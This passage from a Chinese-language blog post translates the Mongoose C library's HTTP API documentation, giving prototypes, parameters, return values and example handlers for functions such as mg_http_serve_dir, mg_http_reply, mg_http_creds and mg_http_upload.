<li>传递给<code>mg_http_serve_dir()</code>和<code>mg_http_serve_file()</code>的结构，该结构驱动了这两个函数的行为</li>
</ul>
</li>
<li><p>原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_http_serve_opts</span> &#123;</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *root_dir;       <span class="comment">// Web root directory, must be non-NULL</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ssi_pattern;    <span class="comment">// SSI file name pattern, e.g. #.shtml</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *extra_headers;  <span class="comment">// Extra HTTP headers to add in responses</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *mime_types;     <span class="comment">// Extra mime types, ext1=type1,ext2=type2,..</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *page404;        <span class="comment">// Path to the 404 page, or NULL by default</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_fs</span> *<span class="title">fs</span>;</span>           <span class="comment">// Filesystem implementation. Use NULL for POSIX</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-serve-dir"><a href="#mg-http-serve-dir" class="headerlink" title="mg_http_serve_dir"></a>mg_http_serve_dir</h2><ul>
<li><p>简介：</p>
<ul>
<li>根据给定选项服务多个静态文件。文件也可以被压缩,包括目录索引。所有压缩文件都必须以.gz结尾，并且不得在没有扩展名的情况下存在具有相同名称的文件，否则将优先考虑</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_http_serve_dir</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="keyword">struct</span> mg_http_message *hm, <span class="type">const</span> <span class="keyword">struct</span> mg_http_serve_opts *opts)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>c : 使用的连接</li>
<li>hm : 应该被服务的HTTP消息</li>
<li>opts : 服务选项。请注意，<code>opts.root_dir</code>可以选择接受额外的逗号分隔<code>uri=path</code></li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Mongoose events handler</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">fn</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">int</span> ev, <span class="type">void</span> *ev_data, <span class="type">void</span> *fn_data)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (ev == MG_EV_HTTP_MSG) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mg_http_message</span> *<span class="title">hm</span> =</span> (<span class="keyword">struct</span> mg_http_message *) ev_data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mg_http_serve_opts</span> <span class="title">opts</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;opts, <span class="number">0</span>, <span class="keyword">sizeof</span>(opts));</span><br><span class="line">    opts.root_dir = <span class="string">&quot;/var/www,/conf=/etc&quot;</span>;  <span class="comment">// Serve /var/www. URIs starting with /conf are served from /etc</span></span><br><span class="line">    mg_http_serve_dir(c, hm, &amp;opts);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-serve-file"><a href="#mg-http-serve-file" class="headerlink" title="mg_http_serve_file"></a>mg_http_serve_file</h2><ul>
<li><p>简介：</p>
<ul>
<li>服务一个静态文件。如果不存在带有路径中指定的文件名的文件，则Mongoose尝试附加<code>.gz</code>；如果存在这样的文件，它将使用<code>Content-Encoding: gzip</code> header 去服务</li>
</ul>
</li>
<li><p>原型:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_http_serve_file</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="keyword">struct</span> mg_http_message *hm, <span class="type">const</span> <span class="type">char</span> *path, <span class="keyword">struct</span> mg_http_serve_opts *opts)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>c : 使用连接</li>
<li>hm : 需要服务的HTTP消息</li>
<li>path : 需要服务的文件路径</li>
<li>opts : 服务选项</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Mongoose events handler</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">fn</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">int</span> ev, <span class="type">void</span> *ev_data, <span class="type">void</span> *fn_data)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (ev == MG_EV_HTTP_MSG) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mg_http_message</span> *<span class="title">hm</span> =</span> (<span class="keyword">struct</span> mg_http_message *) ev_data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mg_http_serve_opts</span> <span class="title">opts</span> =</span> &#123;</span><br><span class="line">      .mime_types = <span class="string">&quot;png=image/png&quot;</span>,</span><br><span class="line">      .extra_headers = <span class="string">&quot;AA: bb\r\nCC: dd\r\n&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line">    mg_http_serve_file(c, hm, <span class="string">&quot;a.png&quot;</span>, &amp;opts);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-reply"><a href="#mg-http-reply" class="headerlink" title="mg_http_reply"></a>mg_http_reply</h2><ul>
<li><p>简介：</p>
<ul>
<li>通过使用<code>printf()</code>语义发送简单的HTTP响应。这个函数根据<code>body_fmt</code>格式化响应体(response body)，然后自动追加到一个正确的<code>Content-Length</code>头(header)。额外的<code>headers</code>需要通过<code>headers</code>参数传递</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_http_reply</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">int</span> status_code, <span class="type">const</span> <span class="type">char</span> *headers, <span class="type">const</span> <span class="type">char</span> *body_fmt, ...)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>c : 一个连接</li>
<li>status_code : 一个HTTP响应状态码</li>
<li>headers : 额外的headers，默认为NULL，如果不是空，则必须以<code>\r\n</code>结尾</li>
<li>fmt : 使用<code>printf</code>语义，需要格式化成HTTP body的字符串</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 发送一个简单的JSON响应：</span></span><br><span class="line">mg_http_reply(c, <span class="number">200</span>, <span class="string">&quot;Content-Type: application/json\r\n&quot;</span>, <span class="string">&quot;&#123;\&quot;result\&quot;: %d&#125;&quot;</span>, <span class="number">123</span>);</span><br><span class="line"><span class="comment">// 发送一个302重定向：</span></span><br><span class="line">mg_http_reply(c, <span class="number">302</span>, <span class="string">&quot;Location: /\r\n&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="comment">// 发送一个错误</span></span><br><span class="line">mg_http_reply(c, <span class="number">403</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;Not Authorized\n&quot;</span>);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-get-header"><a href="#mg-http-get-header" class="headerlink" title="mg_http_get_header"></a>mg_http_get_header</h2><ul>
<li><p>简介：</p>
<ul>
<li>获取HTTP header值</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> mg_str *<span class="title function_">mg_http_get_header</span><span class="params">(<span class="keyword">struct</span> mg_http_message *hm, <span class="type">const</span> <span class="type">char</span> *name)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>hm : 需要寻找 header 的HTTP消息</li>
<li>name : Header name</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，HTTP header</li>
<li>失败，NULL</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Mongoose event handler</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">fn</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">int</span> ev, <span class="type">void</span> *ev_data, <span class="type">void</span> *fn_data)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (ev == MG_EV_HTTP_MSG) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mg_http_message</span> *<span class="title">hm</span> =</span> (<span class="keyword">struct</span> mg_http_message *) ev_data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mg_str</span> *<span class="title">s</span> =</span> mg_http_get_header(hm, <span class="string">&quot;X-Extra-Header&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="literal">NULL</span>) &#123;</span><br><span class="line">      mg_http_reply(c, <span class="number">200</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Holly molly! Header value: %.*s&quot;</span>, (<span class="type">int</span>) s-&gt;len, s-&gt;ptr);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      mg_http_reply(c, <span class="number">200</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;Oh no, header is not set...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-get-header-var"><a href="#mg-http-get-header-var" class="headerlink" title="mg_http_get_header_var"></a>mg_http_get_header_var</h2><ul>
<li><p>简介：</p>
<ul>
<li>解析具有表格<code>name1=value1; name=value2;...</code>的HTTP header，并获取一个给定的变量</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> mg_str <span class="title function_">mg_http_get_header_var</span><span class="params">(<span class="keyword">struct</span> mg_str s, <span class="keyword">struct</span> mg_str v)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>s : HTTP header</li>
<li>name : 变量名字</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，一个请求的变量</li>
<li>失败，一个空的字符串</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_str</span> *<span class="title">cookie</span> =</span> mg_http_get_header(hm, <span class="string">&quot;Cookie&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_str</span> <span class="title">token</span> =</span> mg_str(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cookie != <span class="literal">NULL</span>) &#123;</span><br><span class="line">  token = mg_http_get_header_var(*cookie, mg_str(<span class="string">&quot;access_token&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-var"><a href="#mg-http-var" class="headerlink" title="mg_http_var"></a>mg_http_var</h2><ul>
<li><p>简介：</p>
<ul>
<li>获取未编码的HTTP变量</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> mg_str <span class="title function_">mg_http_var</span><span class="params">(<span class="keyword">struct</span> mg_str buf, <span class="keyword">struct</span> mg_str name)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>buf : 一个url编码的字符串：HTTP请求体或查询字符串(HTTP request body or query string)</li>
<li>name : 获取的变量名字</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回变量的值</li>
<li>失败，返回一个空字符串</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// We have received a request to /my/uri?a=b&amp;c=d%20</span></span><br><span class="line"><span class="comment">// The hm-&gt;query points to &quot;a=b&amp;c=d%20&quot;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_str</span> <span class="title">v</span> =</span> mg_http_var(hm-&gt;query, mg_str(<span class="string">&quot;c&quot;</span>));  <span class="comment">// v = &quot;d%20&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-get-var"><a href="#mg-http-get-var" class="headerlink" title="mg_http_get_var"></a>mg_http_get_var</h2><ul>
<li><p>简介：</p>
<ul>
<li>获取并解码HTTP 变量</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mg_http_get_var</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> mg_str *var, <span class="type">const</span> <span class="type">char</span> *name, <span class="type">char</span> *buf, <span class="type">int</span> len)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>var : HTTP请求体(HTTP request body)</li>
<li>name : 变量名</li>
<li>buf : 写入解码变量的缓冲区(Buffer to write decoded variable)</li>
<li>len : 缓冲区大小</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，解码变量的长度， 0</li>
<li>失败，返回负数</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">mg_http_get_var(&amp;hm-&gt;body, <span class="string">&quot;key1&quot;</span>, buf, <span class="keyword">sizeof</span>(buf)) &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-creds"><a href="#mg-http-creds" class="headerlink" title="mg_http_creds"></a>mg_http_creds</h2><ul>
<li><p>简介：</p>
<ul>
<li>从请求获取身份验证证书，然后将它存储到<code>user</code>, <code>userlen</code>, <code>pass</code>, <code>passlen</code>缓冲区中。</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_http_creds</span><span class="params">(<span class="keyword">struct</span> mg_http_message *hm, <span class="type">char</span> *user, <span class="type">size_t</span> userlen, <span class="type">char</span> *pass, <span class="type">size_t</span> passlen)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>hm : 需要查找证书的HTTP 消息</li>
<li>user : 接收用户名字的缓冲区</li>
<li>userlen : user缓冲区的大小</li>
<li>pass : 接收密码的缓冲区</li>
<li>passlen : pass缓冲区的大小</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Mongoose events handler</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">fn</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">int</span> ev, <span class="type">void</span> *ev_data, <span class="type">void</span> *fn_data)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (ev == MG_EV_HTTP_MSG) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mg_http_message</span> *<span class="title">hm</span> =</span> (<span class="keyword">struct</span> mg_http_message *) ev_data;</span><br><span class="line">    <span class="type">char</span> user[<span class="number">100</span>], pass[<span class="number">100</span>];</span><br><span class="line">    mg_http_creds(hm, user, <span class="keyword">sizeof</span>(user), pass, <span class="keyword">sizeof</span>(pass)); <span class="comment">// &quot;user&quot; is now user name and &quot;pass&quot; is now password from request</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-match-uri"><a href="#mg-http-match-uri" class="headerlink" title="mg_http_match_uri"></a>mg_http_match_uri</h2><ul>
<li><p>简介：</p>
<ul>
<li>检查在HTTP请求报文中，是否有和给定的<code>glob</code>字符串相匹配的字符串</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">mg_http_match_uri</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> mg_http_message *hm, <span class="type">const</span> <span class="type">char</span> *glob)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>hm : 需要匹配检索的HTTP消息</li>
<li>glob : 匹配的字符串</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，true </li>
<li>失败，false</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Mongoose events handler</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">fn</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">int</span> ev, <span class="type">void</span> *ev_data, <span class="type">void</span> *fn_data)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (ev == MG_EV_HTTP_MSG) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mg_http_message</span> *<span class="title">hm</span> =</span> (<span class="keyword">struct</span> mg_http_message *) ev_data;</span><br><span class="line">    <span class="keyword">if</span> (mg_http_match_uri(hm, <span class="string">&quot;/secret&quot;</span>)) &#123;</span><br><span class="line">      mg_http_reply(c, <span class="number">200</span>, <span class="literal">NULL</span>, <span class="string">&quot;Very big secret!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      mg_http_reply(c, <span class="number">200</span>, <span class="literal">NULL</span>, <span class="string">&quot;hello world..&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-bauth"><a href="#mg-http-bauth" class="headerlink" title="mg_http_bauth"></a>mg_http_bauth</h2><ul>
<li><p>简介：</p>
<ul>
<li>将一个基本的<code>Authorization</code> header写入到输出缓冲区</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">mg_http_bauth</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">const</span> <span class="type">char</span> *user, <span class="type">const</span> <span class="type">char</span> *pass)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>c : 使用的连接</li>
<li>user : 用户名</li>
<li>pass : 密码</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>无</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mg_printf(c, <span class="string">&quot;POST /v1/subscriptions HTTP/1.1\r\n&quot;</span></span><br><span class="line">             <span class="string">&quot;Host: api.stripe.com\r\n&quot;</span></span><br><span class="line">             <span class="string">&quot;Transfer-Encoding: chunked\r\n&quot;</span>);</span><br><span class="line">mg_http_bauth(c, stripe_private_key, <span class="literal">NULL</span>);     <span class="comment">// Add Basic auth header</span></span><br><span class="line">mg_printf(c, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;\r\n&quot;</span>);                     <span class="comment">// End HTTP headers</span></span><br><span class="line"></span><br><span class="line">mg_http_printf_chunk(c, <span class="string">&quot;&amp;customer=%s&quot;</span>, customer_id);   <span class="comment">// Set customer</span></span><br><span class="line">mg_http_printf_chunk(c, <span class="string">&quot;&amp;items[0][price]=%s&quot;</span>, price);  <span class="comment">// And price</span></span><br><span class="line">mg_http_printf_chunk(c, <span class="string">&quot;&quot;</span>);                            <span class="comment">// End request</span></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="struct-mg-http-part"><a href="#struct-mg-http-part" class="headerlink" title="struct mg_http_part"></a>struct mg_http_part</h2><ul>
<li><p>简介：</p>
<ul>
<li>描述HTTP 多个消息(multipart message)中单个部分的结构体</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Parameter for mg_http_next_multipart</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_http_part</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_str</span> <span class="title">name</span>;</span>      <span class="comment">// Form field name</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_str</span> <span class="title">filename</span>;</span>  <span class="comment">// Filename for file uploads</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">mg_str</span> <span class="title">body</span>;</span>      <span class="comment">// Part contents</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-next-multipart"><a href="#mg-http-next-multipart" class="headerlink" title="mg_http_next_multipart"></a>mg_http_next_multipart</h2><ul>
<li><p>简介：</p>
<ul>
<li>根据给定的<code>offset</code>，在<code>body</code>中解析multipart chunk。一个初始的<code>offset</code>应该为0.在提供的<code>part</code>中填充参数，可能为空。返回下一块的offsete，或者返回0表示没有其他块(chunks)</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">mg_http_next_multipart</span><span class="params">(<span class="keyword">struct</span> mg_str body, <span class="type">size_t</span> offset, <span class="keyword">struct</span> mg_http_part *part)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>body : 消息体</li>
<li>offset : 开始偏移量</li>
<li>part : 指向需要填充的<code>struct mg_http_part</code>结构体</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回下一块的offset</li>
<li>失败，返回0，或者表示没有其他块</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mg_http_part</span> <span class="title">part</span>;</span></span><br><span class="line"><span class="type">size_t</span> pos = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((pos = mg_http_next_multipart(body, pos, &amp;part)) != <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="comment">// Use part</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="mg-http-upload"><a href="#mg-http-upload" class="headerlink" title="mg_http_upload"></a>mg_http_upload</h2><ul>
<li><p>简介：</p>
<ul>
<li>这是一个助手实用程序功能，用于通过小块上传大型文件。将HTTP POST 数据追加到指定目录的文件中。文件名和文件偏移由查询字符串参数指定:<code>POST /upload?name=firmware.bin&amp;offset=2048 HTTP/1.1</code>。如果偏移量为0，则将文件截断。客户的责任是将文件分为较小的块，并发送一系列由此功能处理的POST请求</li>
</ul>
</li>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">mg_http_upload</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="keyword">struct</span> mg_http_message *hm, <span class="keyword">struct</span> mg_fs *fs, <span class="type">const</span> <span class="type">char</span> *path, <span class="type">size_t</span> max_size)</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>参数：</p>
<ul>
<li>c : 一个连接</li>
<li>hm : 一个需要被解析的HTTP message</li>
<li>fs : 需要写文件的文件系统，例如：<code>&amp;mg_fs_posix</code></li>
<li>path : 一个文件名</li>
<li>max_size : 允许的文件大小的最大值</li>
</ul>
</li>
<li><p>返回值：</p>
<ul>
<li>成功，返回文件的大小</li>
<li>失败，返回一个负数</li>
</ul>
</li>
<li><p>示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">fn</span><span class="params">(<span class="keyword">struct</span> mg_connection *c, <span class="type">int</span> ev, <span class="type">void</span> *ev_data, <span class="type">void</span> *fn_data)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (ev == MG_EV_HTTP_MSG) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mg_http_message</span> *<span class="title">hm</span> =</span> (<span class="keyword">struct</span> mg_http_message *) ev_data;</span><br><span class="line">    <span class="keyword">if</span> (mg_http_match_uri(hm, <span class="string">&quot;/upload&quot;</span>)) &#123;</span><br><span class="line">      mg_http_upload(c, hm, &amp;mg_fs_posix, <span class="string">&quot;/tmp/myfile.bin&quot;</span>, <span class="number">99999</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">struct</span> mg_http_serve_opts opts = &#123;.root_dir = <span class="string">&quot;.&quot;</span>&#125;;   <span class="comment">// Serve</span></span><br><span class="line">      mg_http_serve_dir(c, ev_data, &amp;opts);                 <span class="comment">// static content</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://junyiha.github.io/2024/05/22/notebook/Mongoose/mongoose_1_%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3/2024-05-22-mongoose_sntp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="zhang junyi">
      <meta itemprop="description" content="工作学习笔记">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="junyi's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
